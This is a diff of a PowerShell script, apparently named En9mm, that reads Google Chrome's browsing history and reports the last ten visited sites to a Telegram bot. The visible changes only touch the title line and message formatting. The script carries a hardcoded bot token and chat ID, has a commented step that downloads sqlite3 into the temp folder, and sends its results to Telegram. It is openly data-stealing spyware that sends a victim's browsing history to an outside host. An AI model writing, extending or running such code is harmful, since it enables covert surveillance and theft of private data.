@@ -1,8 +1,8 @@
-# En9mm - Advanced Chrome History Extractor with Telegram Reporting
+# En9mm - Final Version - Chrome History Extractor with Telegram Reporting
 
 $Token  = "7921423137:AAHj4kDraZc0BRPk6c6j7TC2vJE5Dy-6j0g"
 $ChatID = "774651165"
-$Msg    = "🧠 *Chrome Last 10 Visited Sites:*\n"
+$Msg    = "🧠 *Chrome Last 10 Visited Sites:*`n"
 
 # تحميل أداة SQLite إذا لم تكن موجودة
 $sqlitePath = "$env:TEMP\sqlite3.exe"
@@ -24,10 +24,10 @@ if (Test-Path $chromeHistory) {
     if ($results) {
         $Msg += "```\n$results\n```"
     } else {
-        $Msg += "`n❌ *No data found in Chrome history.*"
+        $Msg += "`n❌ No data found in Chrome history."
     }
 } else {
-    $Msg += "`n⚠️ *Chrome history database not found.*"
+    $Msg += "`n⚠️ Chrome history database not found."
 }
 
 # إرسال الرسالة إلى Telegram
